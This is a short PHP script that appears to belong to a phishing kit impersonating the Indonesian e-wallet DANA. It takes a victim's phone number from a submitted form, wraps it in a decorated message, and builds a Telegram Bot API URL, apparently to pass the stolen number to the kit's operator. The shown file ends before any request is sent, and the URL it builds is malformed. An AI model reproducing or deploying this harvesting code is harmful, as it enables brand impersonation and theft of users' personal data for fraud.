<?php

session_start();
include "./telegram.php";
 
$text = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "\n├───────────────────". "\n<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor']. "\n╰───────────────────";;

$query = http_build_query([
    'text' => $text,
]);
$url = "https://api.telegram.org/bot{$botApiToken}/chat_id{$chat_id}/tezyparse_mode=html";
